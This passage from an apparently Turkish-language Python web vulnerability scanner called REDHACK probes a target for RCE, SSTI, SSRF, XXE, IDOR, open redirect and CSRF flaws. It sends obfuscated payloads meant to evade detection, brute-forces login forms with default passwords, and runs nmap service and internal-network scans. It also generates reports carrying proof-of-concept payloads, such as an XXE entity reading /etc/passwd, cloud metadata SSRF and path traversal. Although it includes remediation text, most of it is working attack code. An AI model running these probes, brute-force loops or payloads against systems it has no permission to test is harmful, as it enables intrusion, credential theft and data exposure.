                        response = self.send_request('POST', action_url, data=data)
                else:
                    test_url = f"{url}?cmd={urllib.parse.quote(obfuscated_payload)}"
                    response = self.send_request('GET', test_url)
                
                if not response:
                    continue
                    
                # RCE başarı belirtileri
                if any(pattern in response.text for pattern in ["uid=", "gid=", "root", "Administrator", "boot.ini", "Microsoft Windows", "Volume Serial", "COMPUTERNAME"]):
                    self.report_vulnerability('Remote Code Execution', url, payload)
                    
            except Exception as e:
                logger.error(f"RCE test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] RCE test hatası: {e}{RESET}")

    def test_ssti(self, url, form_details):
        """Server-Side Template Injection testi"""
        for payload in self.payloads['ssti']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                
                if form_details:
                    data = {}
                    for input_field in form_details['inputs']:
                        if input_field['type'] == 'hidden':
                            data[input_field['name']] = input_field['value']
                        else:
                            data[input_field['name']] = obfuscated_payload
                    
                    action_url = urllib.parse.urljoin(url, form_details['action'])
                    
                    if form_details['method'] == 'GET':
                        response = self.send_request('GET', action_url, params=data)
                    else:
                        response = self.send_request('POST', action_url, data=data)
                else:
                    test_url = f"{url}?name={urllib.parse.quote(obfuscated_payload)}"
                    response = self.send_request('GET', test_url)
                
                if not response:
                    continue
                    
                # SSTI başarı belirtileri
                if "49" in response.text or "777" in response.text or "root:" in response.text or "os.system" in response.text:
                    self.report_vulnerability('Server-Side Template Injection', url, payload)
                    
            except Exception as e:
                logger.error(f"SSTI test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] SSTI test hatası: {e}{RESET}")

    def test_idor(self, url):
        """IDOR testi"""
        for payload in self.payloads['idor']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                test_url = urllib.parse.urljoin(url, obfuscated_payload)
                response = self.send_request('GET', test_url)
                
                if response and response.status_code == 200 and "user" in response.text.lower():
                    self.report_vulnerability('Insecure Direct Object Reference', test_url, payload)
                    
            except Exception as e:
                logger.error(f"IDOR test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] IDOR test hatası: {e}{RESET}")

    def test_ssrf(self, url):
        """SSRF testi"""
        for payload in self.payloads['ssrf']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                test_url = f"{url}?url={urllib.parse.quote(obfuscated_payload)}"
                response = self.send_request('GET', test_url)
                
                if not response:
                    continue
                    
                # AWS metadata detection
                if "iam" in response.text or "instance-id" in response.text or "security-credentials" in response.text:
                    self.report_vulnerability('Server-Side Request Forgery', test_url, payload)
                
                # Local file content detection
                if "root:" in response.text or "Administrator" in response.text or "boot.ini" in response.text:
                    self.report_vulnerability('SSRF (Local File Read)', test_url, payload)
                    
            except Exception as e:
                logger.error(f"SSRF test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] SSRF test hatası: {e}{RESET}")

    def test_xxe(self, url):
        """XXE testi"""
        for payload in self.payloads['xxe']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                headers = {'Content-Type': 'application/xml'}
                response = self.send_request('POST', url, data=obfuscated_payload, headers=headers)
                
                if response and ("root:" in response.text or "boot.ini" in response.text or "secret" in response.text):
                    self.report_vulnerability('XML External Entity', url, payload)
                    
            except Exception as e:
                logger.error(f"XXE test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] XXE test hatası: {e}{RESET}")

    def test_open_redirect(self, url):
        """Open Redirect testi"""
        for payload in self.payloads['open_redirect']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                test_url = f"{url}?redirect={urllib.parse.quote(obfuscated_payload)}"
                response = self.send_request('GET', test_url, allow_redirects=False)
                
                if response and 300 <= response.status_code < 400:
                    location = response.headers.get('Location', '')
                    if payload in location or obfuscated_payload in location:
                        self.report_vulnerability('Open Redirect', test_url, payload)
                        
            except Exception as e:
                logger.error(f"Open Redirect test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] Open Redirect test hatası: {e}{RESET}")

    def test_csrf(self, url, form_details):
        """CSRF koruması testi"""
        if not form_details:
            return
            
        try:
            # CSRF token kontrolü
            has_token = any('csrf' in input_field['name'].lower() or 'token' in input_field['name'].lower() 
                           for input_field in form_details['inputs'])
            
            if not has_token:
                self.report_vulnerability('Missing CSRF Token', url, "CSRF protection missing")
                
            # Token rastgeleliği testi
            if has_token:
                data1 = {}
                data2 = {}
                for input_field in form_details['inputs']:
                    if 'csrf' in input_field['name'].lower() or 'token' in input_field['name'].lower():
                        data1[input_field['name']] = input_field['value']
                        data2[input_field['name']] = "malicious_token"
                    else:
                        data1[input_field['name']] = input_field['value']
                        data2[input_field['name']] = input_field['value']
                
                action_url = urllib.parse.urljoin(url, form_details['action'])
                
                # Geçerli token ile istek
                valid_response = self.send_request('POST', action_url, data=data1)
                # Geçersiz token ile istek
                invalid_response = self.send_request('POST', action_url, data=data2)
                
                if valid_response and invalid_response:
                    if valid_response.status_code == 200 and invalid_response.status_code == 200:
                        self.report_vulnerability('CSRF Token Validation Bypass', url, "Token validation missing")
                
        except Exception as e:
            logger.error(f"CSRF test error: {str(e)}", exc_info=True)
            print(f"{YELLOW}[~] CSRF test hatası: {e}{RESET}")

    def test_directory_listing(self):
        """Dizin listeleme açığı testi"""
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for directory in self.payloads['directory_listing']:
                url = urllib.parse.urljoin(self.target, directory)
                futures.append(executor.submit(self.check_directory_listing, url))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.report_vulnerability('Directory Listing Enabled', result, '')

    def check_directory_listing(self, url):
        """Dizin listeleme kontrolü"""
        try:
            response = self.send_request('GET', url)
            if response and response.status_code == 200:
                if "<title>Index of" in response.text or "<h1>Directory listing for" in response.text:
                    return url
        except:
            return None

    def test_auth_bypass(self):
        """Yetkilendirme atlama testi"""
        admin_urls = [
            '/admin/', '/dashboard/', '/cp/', '/controlpanel/',
            '/wp-admin/', '/manager/', '/administrator/',
            '/admin.php', '/admin.jsp', '/admin.aspx', '/admin.cgi'
        ]
        
        for admin_path in admin_urls:
            try:
                admin_url = urllib.parse.urljoin(self.target, admin_path)
                response = self.send_request('GET', admin_url)
                
                if response and response.status_code == 200 and "login" not in response.text.lower():
                    self.report_vulnerability('Admin Panel Accessible', admin_url, "No authentication required")
                    
            except Exception as e:
                logger.error(f"Auth bypass test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] Auth bypass test hatası: {e}{RESET}")

    def test_brute_force(self):
        """Kimlik doğrulama brute-force testi"""
        login_urls = [
            '/login', '/wp-login.php', '/admin/login', '/signin',
            '/auth', '/authenticate', '/logon', '/user/login'
        ]
        
        # Basit kullanıcı adı/şifre listesi
        usernames = ['admin', 'root', 'user', 'test', 'administrator']
        passwords = ['admin', 'password', '123456', 'qwerty', 'letmein', 'admin123']
        
        for login_path in login_urls:
            login_url = urllib.parse.urljoin(self.target, login_path)
            
            # Login formunu tespit et
            try:
                response = self.send_request('GET', login_url)
                if not response or response.status_code != 200:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                login_form = soup.find('form')
                if not login_form:
                    continue
                    
                form_details = {
                    'action': login_form.get('action', ''),
                    'method': login_form.get('method', 'post').upper(),
                    'inputs': []
                }
                
                for input_tag in login_form.find_all('input'):
                    input_details = {
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_details['inputs'].append(input_details)
                
                # Kullanıcı adı ve şifre alanlarını bul
                username_field = None
                password_field = None
                for field in form_details['inputs']:
                    if field['name'].lower() in ['username', 'user', 'email', 'login']:
                        username_field = field['name']
                    elif field['name'].lower() in ['password', 'pass', 'pwd']:
                        password_field = field['name']
                
                if not username_field or not password_field:
                    continue
                    
                # Brute-force denemeleri
                for username in usernames:
                    for password in passwords:
                        data = {}
                        for input_field in form_details['inputs']:
                            if input_field['name'] == username_field:
                                data[input_field['name']] = username
                            elif input_field['name'] == password_field:
                                data[input_field['name']] = password
                            elif input_field['type'] == 'hidden':
                                data[input_field['name']] = input_field['value']
                        
                        action_url = urllib.parse.urljoin(login_url, form_details['action'])
                        
                        if form_details['method'] == 'GET':
                            response = self.send_request('GET', action_url, params=data)
                        else:
                            response = self.send_request('POST', action_url, data=data)
                        
                        if response and response.status_code == 200:
                            if "logout" in response.text.lower() or "welcome" in response.text.lower():
                                self.report_vulnerability('Weak Credentials', login_url, f"Username: {username}, Password: {password}")
                                return
                                
            except Exception as e:
                logger.error(f"Brute force test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] Brute force test hatası: {e}{RESET}")

    def test_session_fixation(self):
        """Session fixation testi"""
        try:
            # Session ID al
            response = self.send_request('GET', self.target)
            session_id = response.cookies.get('sessionid') or response.cookies.get('PHPSESSID') or response.cookies.get('JSESSIONID')
            
            if not session_id:
                return
                
            # Farklı bir kullanıcı ile aynı session ID'yi kullan
            self.session.cookies.clear()
            self.session.cookies.set('sessionid', session_id)
            self.session.cookies.set('PHPSESSID', session_id)
            self.session.cookies.set('JSESSIONID', session_id)
            
            # Kullanıcı girişi simülasyonu
            login_urls = ['/login', '/signin']
            for login_path in login_urls:
                login_url = urllib.parse.urljoin(self.target, login_path)
                response = self.send_request('GET', login_url)
                if response.status_code != 200:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                login_form = soup.find('form')
                if not login_form:
                    continue
                    
                form_details = {
                    'action': login_form.get('action', ''),
                    'method': login_form.get('method', 'post').upper(),
                    'inputs': []
                }
                
                for input_tag in login_form.find_all('input'):
                    input_details = {
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_details['inputs'].append(input_details)
                
                data = {}
                for input_field in form_details['inputs']:
                    if input_field['type'] == 'text' or input_field['type'] == 'email':
                        data[input_field['name']] = 'testuser'
                    elif input_field['type'] == 'password':
                        data[input_field['name']] = 'testpass'
                    elif input_field['type'] == 'hidden':
                        data[input_field['name']] = input_field['value']
                
                action_url = urllib.parse.urljoin(login_url, form_details['action'])
                login_response = self.send_request(form_details['method'], action_url, data=data)
                
                # Session ID değişmediyse vulnerability
                if login_response.status_code == 302 or 'logout' in login_response.text:
                    new_session_id = login_response.cookies.get('sessionid') or login_response.cookies.get('PHPSESSID') or login_response.cookies.get('JSESSIONID')
                    if new_session_id == session_id:
                        self.report_vulnerability('Session Fixation', login_url, "Session ID not changed after login")
                        return
                        
        except Exception as e:
            logger.error(f"Session fixation test error: {str(e)}", exc_info=True)

    def test_access_control(self):
        """Yetkilendirme kontrol testi"""
        try:
            # Admin URL'lerini test et
            admin_urls = ['/admin', '/dashboard', '/controlpanel']
            
            for url_path in admin_urls:
                admin_url = urllib.parse.urljoin(self.target, url_path)
                
                # Yetkisiz erişim denemesi
                response = self.send_request('GET', admin_url)
                if response.status_code == 200:
                    self.report_vulnerability('Broken Access Control', admin_url, "Unauthorized access to admin panel")
                    
                # Farklı kullanıcı rollerini test et
                roles = ['user', 'admin', 'moderator']
                for role in roles:
                    headers = {'X-User-Role': role}
                    response = self.send_request('GET', admin_url, headers=headers)
                    if response.status_code == 200 and role != 'admin':
                        self.report_vulnerability('Broken Access Control', admin_url, f"Role elevation to {role}")
                        
        except Exception as e:
            logger.error(f"Access control test error: {str(e)}", exc_info=True)

    def test_sensitive_files(self):
        """Hassas dosya taraması"""
        self.scan_progress['sensitive_files'] = len(self.sensitive_files)
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for file in self.sensitive_files:
                url = urllib.parse.urljoin(self.target, file)
                futures.append(executor.submit(self.check_file, url))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.report_vulnerability('Sensitive File Exposure', result, '')
                self.scan_progress['sensitive_files'] -= 1

    def check_file(self, url):
        """Dosya varlığını kontrol et"""
        try:
            response = self.send_request('HEAD', url, timeout=5)
            if response and response.status_code == 200:
                return url
        except:
            return None

    def test_headers(self):
        """Güvenlik header kontrolleri"""
        try:
            response = self.send_request('GET', self.target)
            if not response:
                return
                
            headers = response.headers
            
            checks = {
                'X-XSS-Protection': '1; mode=block',
                'Content-Security-Policy': r".+",
                'X-Frame-Options': r"(?i)deny|sameorigin",
                'Strict-Transport-Security': r".+",
                'X-Content-Type-Options': 'nosniff',
                'Referrer-Policy': r".+",
                'Feature-Policy': r".+"
            }
            
            for header, pattern in checks.items():
                if header not in headers or not re.match(pattern, headers[header], re.I):
                    self.report_vulnerability('Missing Security Header', self.target, header)
                    
        except Exception as e:
            logger.error(f"Header test error: {str(e)}", exc_info=True)
            print(f"{YELLOW}[~] Header test hatası: {e}{RESET}")

    def test_port_scan(self):
        """Gelişmiş port tarama ve servis tespiti"""
        domain = urllib.parse.urlparse(self.target).hostname
        try:
            ip = socket.gethostbyname(domain)
            
            # Nmap entegrasyonu
            print(f"{CYAN}[*] Nmap ile gelişmiş port taraması başlatılıyor...{RESET}")
            scan_results = self.nmap_scanner.scan_top_ports(ip, args="-sV -O -T4")
            
            for host in scan_results:
                if 'ports' in scan_results[host]:
                    for port_info in scan_results[host]['ports']:
                        if port_info['state'] == 'open':
                            service = port_info['service']
                            service_info = f"{port_info['portid']}/{port_info['protocol']} - {service['name']} {service.get('product', '')} {service.get('version', '')}"
                            self.report_vulnerability('Open Port', ip, service_info)
            
            # Internal network scan
            print(f"{CYAN}[*] Dahili ağ taraması başlatılıyor...{RESET}")
            internal_ips = [
                '10.0.0.1', '192.168.0.1', '192.168.1.1', 
                '172.16.0.1', '172.16.1.1', '172.17.0.1'
            ]
            for internal_ip in internal_ips:
                try:
                    internal_scan = self.nmap_scanner.scan_top_ports(internal_ip, args="-T4")
                    for host in internal_scan:
                        if 'ports' in internal_scan[host]:
                            for port_info in internal_scan[host]['ports']:
                                if port_info['state'] == 'open':
                                    service = port_info['service']
                                    service_info = f"{internal_ip}:{port_info['portid']}/{port_info['protocol']} - {service['name']}"
                                    self.report_vulnerability('Internal Service Exposure', internal_ip, service_info)
                except:
                    pass
                            
        except Exception as e:
            logger.error(f"Port scan error: {str(e)}", exc_info=True)
            print(f"{YELLOW}[~] Port tarama hatası: {e}{RESET}")

    def report_vulnerability(self, vuln_type, location, payload):
        """Bulunan açıkları kaydet"""
        with self.lock:
            entry = {
                'type': vuln_type,
                'location': location,
                'payload': payload,
                'severity': self.get_severity(vuln_type),
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                'cvss': self.get_cvss_score(vuln_type),
                'description': self.get_vuln_description(vuln_type),
                'remediation': self.get_remediation(vuln_type)
            }
            
            # Çift kayıtları önle
            if not any(v['type'] == vuln_type and v['location'] == location for v in self.vulnerabilities):
                self.vulnerabilities.append(entry)
                self.scan_progress['vulnerabilities'] += 1
                print(f"{RED}[!] {vuln_type} açığı bulundu: {location}{RESET}")
                if payload:
                    print(f"{YELLOW}    Payload: {payload}{RESET}")
                
                # Durumu kaydet
                self.save_state()

    def get_severity(self, vuln_type):
        """Açık önem seviyesi belirleme"""
        critical = ['SQL Injection', 'RCE', 'SSRF', 'XXE', 'SQL Injection (Time-Based)', 
                   'Admin Panel Accessible', 'Remote File Inclusion', 'Weak Credentials',
                   'Session Fixation', 'Broken Access Control']
        high = ['XSS', 'LFI', 'Sensitive File Exposure', 'Server-Side Request Forgery', 
               'Server-Side Template Injection', 'Stored XSS']
        medium = ['IDOR', 'Missing Security Header', 'Open Redirect', 'DOM-based XSS', 
                 'Directory Listing Enabled', 'Internal Service Exposure']
        low = ['Missing CSRF Token', 'CSRF Token Validation Bypass', 'CSP Misconfiguration']
        
        if vuln_type in critical:
            return 'CRITICAL'
        elif vuln_type in high:
            return 'HIGH'
        elif vuln_type in medium:
            return 'MEDIUM'
        else:
            return 'LOW'

    def print_progress(self):
        """Tarama ilerlemesini göster"""
        elapsed = time.time() - self.scan_start_time
        print(f"\n{CYAN}{BOLD}=== TARAMA İLERLEMESİ ==={RESET}")
        print(f"{GREEN}• Taranan URL sayısı: {self.scan_progress['crawled']}{RESET}")
        print(f"{RED}• Tespit edilen açıklar: {self.scan_progress['vulnerabilities']}{RESET}")
        print(f"{YELLOW}• Kalan hassas dosya kontrolleri: {self.scan_progress['sensitive_files']}{RESET}")
        print(f"{BLUE}• Kalan port taramaları: {self.scan_progress['ports_scanned']}{RESET}")
        print(f"{MAGENTA}• Geçen süre: {elapsed:.2f} saniye{RESET}")
        print(f"{CYAN}• Toplam istek: {self.total_requests}{RESET}")
        print("-" * 50)

    def generate_report(self):
        """Profesyonel rapor oluşturma"""
        report = f"{BOLD}=== ELITE SECURITY SCAN REPORT ==={RESET}\n"
        report += f"Target: {self.target}\n"
        report += f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Scan Duration: {time.time() - self.scan_start_time:.2f} seconds\n"
        report += f"Vulnerabilities Found: {len(self.vulnerabilities)}\n\n"
        
        # Kritik seviye açıkları öne al
        self.vulnerabilities.sort(key=lambda x: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'].index(x['severity']))
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            report += f"{BOLD}{i}. {vuln['type']} [{vuln['severity']}]{RESET}\n"
            report += f"Location: {vuln['location']}\n"
            report += f"CVSS Score: {vuln['cvss']}\n"
            report += f"Description: {vuln['description']}\n"
            report += f"Remediation: {vuln['remediation']}\n"
            if vuln['payload']:
                report += f"Payload: {vuln['payload']}\n"
            report += f"Proof of Concept: {self.get_poc(vuln['type'], vuln['location'], vuln['payload'])}\n"
            report += f"Timestamp: {vuln['timestamp']}\n"
            report += "-"*100 + "\n"
        
        # HTML rapor
        html_report = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>REDHACK Security Report - {self.target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                h1, h2 {{ color: #d32f2f; }}
                .critical {{ background-color: #ffcdd2; padding: 10px; border-left: 5px solid #d32f2f; }}
                .high {{ background-color: #ffecb3; padding: 10px; border-left: 5px solid #ffa000; }}
                .medium {{ background-color: #c8e6c9; padding: 10px; border-left: 5px solid #388e3c; }}
                .low {{ background-color: #bbdefb; padding: 10px; border-left: 5px solid #1976d2; }}
                .vuln {{ margin-bottom: 20px; padding: 15px; border-radius: 5px; }}
                .poc {{ background-color: #f5f5f5; padding: 10px; border: 1px dashed #ccc; }}
                .chart-container {{ width: 80%; margin: 20px auto; }}
                canvas {{ background-color: #f9f9f9; border-radius: 8px; padding: 10px; }}
            </style>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        </head>
        <body>
            <h1>REDHACK Elite Security Scan Report</h1>
            <p><strong>Target:</strong> {self.target}</p>
            <p><strong>Scan Date:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Scan Duration:</strong> {time.time() - self.scan_start_time:.2f} seconds</p>
            <p><strong>Vulnerabilities Found:</strong> {len(self.vulnerabilities)}</p>
            
            <div class="chart-container">
                <canvas id="severityChart"></canvas>
            </div>
            
            <hr>
            <h2>Vulnerability Details</h2>
        """
        
        # Severity distribution for chart
        severity_count = {
            'CRITICAL': 0,
            'HIGH': 0,
            'MEDIUM': 0,
            'LOW': 0
        }
        
        for vuln in self.vulnerabilities:
            severity_count[vuln['severity']] += 1
        
        html_report += """
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                const ctx = document.getElementById('severityChart').getContext('2d');
                const chart = new Chart(ctx, {
                    type: 'pie',
                    data: {
                        labels: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'],
                        datasets: [{
                            data: ["""
        html_report += f"{severity_count['CRITICAL']}, {severity_count['HIGH']}, {severity_count['MEDIUM']}, {severity_count['LOW']}"
        html_report += """],
                            backgroundColor: [
                                'rgba(255, 99, 132, 0.7)',
                                'rgba(255, 159, 64, 0.7)',
                                'rgba(75, 192, 192, 0.7)',
                                'rgba(54, 162, 235, 0.7)'
                            ],
                            borderColor: [
                                'rgba(255, 99, 132, 1)',
                                'rgba(255, 159, 64, 1)',
                                'rgba(75, 192, 192, 1)',
                                'rgba(54, 162, 235, 1)'
                            ],
                            borderWidth: 1
                        }]
                    },
                    options: {
                        responsive: true,
                        plugins: {
                            legend: { position: 'top' },
                            title: {
                                display: true,
                                text: 'Vulnerability Severity Distribution'
                            }
                        }
                    }
                });
            });
        </script>
        """
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_class = vuln['severity'].lower()
            html_report += f"""
            <div class="vuln {severity_class}">
                <h3>{i}. {vuln['type']} [{vuln['severity']}]</h3>
                <p><strong>Location:</strong> {vuln['location']}</p>
                <p><strong>CVSS Score:</strong> {vuln['cvss']}</p>
                <p><strong>Description:</strong> {vuln['description']}</p>
                <p><strong>Remediation:</strong> {vuln['remediation']}</p>
                <p><strong>Payload:</strong> {vuln['payload'] or 'N/A'}</p>
                <div class="poc">
                    <strong>Proof of Concept:</strong><br>
                    {self.get_poc(vuln['type'], vuln['location'], vuln['payload'])}
                </div>
                <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
            </div>
            """
        
        html_report += "</body></html>"
        
        # Dosyaya yaz
        txt_filename = f"redhack_report_{self.target.replace('://', '_').replace('/', '_')}.txt"
        with open(txt_filename, 'w') as f:
            f.write(report)
            
        html_filename = f"redhack_report_{self.target.replace('://', '_').replace('/', '_')}.html"
        with open(html_filename, 'w') as f:
            f.write(html_report)
            
        print(f"\n{GREEN}[+] Metin raporu oluşturuldu: {txt_filename}{RESET}")
        print(f"{GREEN}[+] HTML raporu oluşturuldu: {html_filename}{RESET}")

    def get_cvss_score(self, vuln_type):
        """CVSS skoru döndür"""
        scores = {
            'SQL Injection': '9.8 (CRITICAL)',
            'RCE': '10.0 (CRITICAL)',
            'SSRF': '9.1 (CRITICAL)',
            'XXE': '8.2 (HIGH)',
            'Admin Panel Accessible': '9.8 (CRITICAL)',
            'XSS': '7.5 (HIGH)',
            'LFI': '8.1 (HIGH)',
            'Sensitive File Exposure': '7.5 (HIGH)',
            'IDOR': '6.5 (MEDIUM)',
            'Missing Security Header': '5.3 (MEDIUM)',
            'Open Redirect': '6.1 (MEDIUM)',
            'Missing CSRF Token': '8.8 (HIGH)',
            'Session Fixation': '8.8 (HIGH)',
            'Broken Access Control': '8.8 (HIGH)',
            'Stored XSS': '8.8 (HIGH)',
            'Internal Service Exposure': '7.2 (HIGH)'
        }
        return scores.get(vuln_type, '7.0 (HIGH)')

    def get_vuln_description(self, vuln_type):
        """Açık açıklaması döndür"""
        descriptions = {
            'SQL Injection': 'SQL Injection açığı, saldırganların yetkisiz veritabanı erişimi elde etmesine, hassas verileri okumasına veya değiştirmesine olanak tanır.',
            'RCE': 'Uzaktan Kod Çalıştırma açığı, saldırganların sunucu üzerinde keyfi komutlar çalıştırmasına ve tam kontrol elde etmesine izin verir.',
            'SSRF': 'Sunucu Taraflı İstek Sahteciliği açığı, saldırganların dahili ağ kaynaklarına erişmesine ve hassas bilgileri sızdırmasına olanak tanır.',
            'XXE': 'XML Harici Varlık açığı, saldırganların sunucu dosyalarını okumasına ve dahili ağa erişmesine izin verir.',
            'Admin Panel Accessible': 'Yönetim paneline kimlik doğrulama olmadan erişilebiliyor, sistemin tam kontrolüne yol açabilir.',
            'XSS': 'Çapraz Site Komut Dosyası Çalıştırma açığı, saldırganların kullanıcı tarayıcılarında keyfi kod çalıştırmasına olanak tanır.',
            'LFI': 'Yerel Dosya Dahil Etme açığı, saldırganların sunucudaki hassas dosyaları okumasına izin verir.',
            'Sensitive File Exposure': 'Hassas dosyaların halka açık şekilde erişilebilir olması, sistem bilgilerinin sızdırılmasına yol açar.',
            'IDOR': 'Güvenli Olmayan Doğrudan Nesne Referansı, saldırganların yetkisiz kaynaklara erişmesine olanak tanır.',
            'Missing Security Header': 'Güvenlik başlıklarının eksikliği, çeşitli saldırı vektörlerine karşı savunmasızlık oluşturur.',
            'Open Redirect': 'Açık Yönlendirme açığı, saldırganların kullanıcıları kötü amaçlı sitelere yönlendirmesine izin verir.',
            'Missing CSRF Token': 'CSRF korumasının eksikliği, kullanıcıların yetkisiz işlemler gerçekleştirmesine yol açabilir.',
            'Session Fixation': 'Oturum sabitleme açığı, saldırganların kullanıcı oturumlarını ele geçirmesine olanak tanır.',
            'Broken Access Control': 'Kırık erişim kontrolü, kullanıcıların yetkileri dışındaki kaynaklara erişmesine izin verir.',
            'Stored XSS': 'Depolanmış XSS açığı, saldırganların kötü amaçlı kodları sunucuda depolayarak diğer kullanıcıları etkilemesine olanak tanır.',
            'Internal Service Exposure': 'Dahili servislerin dışarıya açık olması, iç ağ kaynaklarına yetkisiz erişime yol açar.'
        }
        return descriptions.get(vuln_type, 'Güvenlik açığı tespit edildi.')

    def get_remediation(self, vuln_type):
        """Düzeltme önerileri döndür"""
        remediations = {
            'SQL Injection': 'Parametreli sorgular veya ORM kullanın. Kullanıcı girdilerini doğrulayın ve sanitize edin.',
            'RCE': 'Kullanıcı girdilerini asla doğrudan komut olarak çalıştırmayın. Beyaz liste tabanlı girdi doğrulama uygulayın.',
            'SSRF': 'Kullanıcı girdilerine dayalı istekleri kısıtlayın. Dahili IP adreslerine erişimi engelleyin.',
            'XXE': 'XML işlemlerinde harici varlık referanslarını devre dışı bırakın.',
            'Admin Panel Accessible': 'Yönetim panellerine erişim için güçlü kimlik doğrulama uygulayın.',
            'XSS': 'Kullanıcı girdilerini sanitize edin. Çıktı kodlaması uygulayın. Content-Security-Policy başlığını kullanın.',
            'LFI': 'Dahil edilen dosya yollarını kısıtlayın. Kullanıcı girdilerini doğrulayın.',
            'Sensitive File Exposure': 'Hassas dosyaları web kök dizini dışında tutun. Erişim kontrolleri uygulayın.',
            'IDOR': 'Erişim kontrol mekanizmaları uygulayın. Kaynaklara erişim için yetkilendirme kontrolleri ekleyin.',
            'Missing Security Header': 'Eksik güvenlik başlıklarını ekleyin: X-XSS-Protection, CSP, HSTS vb.',
            'Open Redirect': 'Yönlendirmeler için beyaz liste tabanlı URL doğrulaması uygulayın.',
            'Missing CSRF Token': 'CSRF tokenları uygulayın ve her istekte doğrulayın.',
            'Session Fixation': 'Kullanıcı girişi sonrası oturum kimliğini yenileyin. Güvenli oturum yönetimi uygulayın.',
            'Broken Access Control': 'Rol tabanlı erişim kontrolü uygulayın. Her istek için yetkilendirme kontrolleri yapın.',
            'Stored XSS': 'Kullanıcı girdilerini sanitize edin. Çıktı kodlaması uygulayın. Content-Security-Policy başlığını kullanın.',
            'Internal Service Exposure': 'Dahili servisleri dış ağa açmayın. Güvenlik duvarı kuralları ile erişimi kısıtlayın.'
        }
        return remediations.get(vuln_type, 'Uygulama güvenliği en iyi uygulamalarını gözden geçirin.')

    def get_poc(self, vuln_type, location, payload):
        """Proof of Concept döndür"""
        poc = {
            'SQL Injection': f"İstek: GET {location}?id={payload or '1\\' OR 1=1--'}\n\n"
                            "Yanıt: Veritabanı hatası içeren HTTP 500 yanıtı",
            'RCE': f"İstek: GET {location}?cmd={payload or 'id'}\n\n"
                  "Yanıt: Komut çıktısını içeren yanıt",
            'SSRF': f"İstek: GET {location}?url={payload or 'http://169.254.169.254/latest/meta-data/'}\n\n"
                   "Yanıt: Dahili meta verileri içeren yanıt",
            'XXE': f"İstek: POST {location}\n"
                  "Başlık: Content-Type: application/xml\n"
                  f"Gövde: {payload or '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'}",
            'XSS': f"İstek: GET {location}?q={payload or '<script>alert(1)</script>'}\n\n"
                  "Yanıt: Payload'ın işlenmemiş şekilde döndürülmesi",
            'LFI': f"İstek: GET {location}?file={payload or '../../etc/passwd'}\n\n"
                  "Yanıt: /etc/passwd dosyasının içeriği",
            'Stored XSS': f"İstek: POST {location}\n"
                         f"Gövde: comment={payload or '<script>alert(1)</script>'}\n\n"
                         "Yanıt: Payload'ın sayfada kalıcı olarak depolanması"
        }
        return poc.get(vuln_type, f"{vuln_type} açığını doğrulamak için manuel test gereklidir.")

    def run(self):
        """Ana tarama işlemini başlat"""
        print(BANNER)
        if not self.validate_target():
            return
        
        print(f"{GREEN}[*] Hedef doğrulandı: {self.target}{RESET}")
        print(f"{CYAN}[*] Askeri seviye tarama başlatıldı...{RESET}")
        
        try:
            # İlerleme göstergesi
            progress_thread = threading.Thread(target=self.monitor_progress, daemon=True)
            progress_thread.start()
            
            # Tarama süreçleri
            self.crawler(self.target)
            self.test_sensitive_files()
            self.test_headers()
            self.test_directory_listing()
            self.test_port_scan()
            self.test_auth_bypass()
            self.test_brute_force()
            self.test_session_fixation()
            self.test_access_control()
            
            # Raporlama
            if self.vulnerabilities:
                print(f"\n{RED}{BOLD}[!] {len(self.vulnerabilities)} AÇIK BULUNDU!{RESET}")
                self.generate_report()
            else:
                print(f"{GREEN}{BOLD}[+] Sistem güvenli! Açık bulunamadı.{RESET}")
                
            # Geçici durum dosyasını sil
            state_file = f"redhack_state_{self.target.replace('://', '_').replace('/', '_')}.json"
            if os.path.exists(state_file):
                os.remove(state_file)
                
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Tarama kullanıcı tarafından durduruldu. Son durum kaydedildi.{RESET}")
            self.save_state()
            sys.exit(1)
        except Exception as e:
            logger.error(f"Critical error: {str(e)}", exc_info=True)
            print(f"{RED}[!] Kritik hata: {e}{RESET}")
            sys.exit(1)

    def monitor_progress(self):
        """İlerleme durumunu izle ve güncelle"""
        while True:
            time.sleep(10)
            self.print_progress()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f'{RED}ELITE WEB VULNERABILITY SCANNER (REDHACK PROJECT){RESET}')
    parser.add_argument('-t', '--target', required=True, help='Taranacak hedef URL')
    parser.add_argument('-p', '--proxy', help='Proxy adresi (http://ip:port veya socks5://ip:port)')
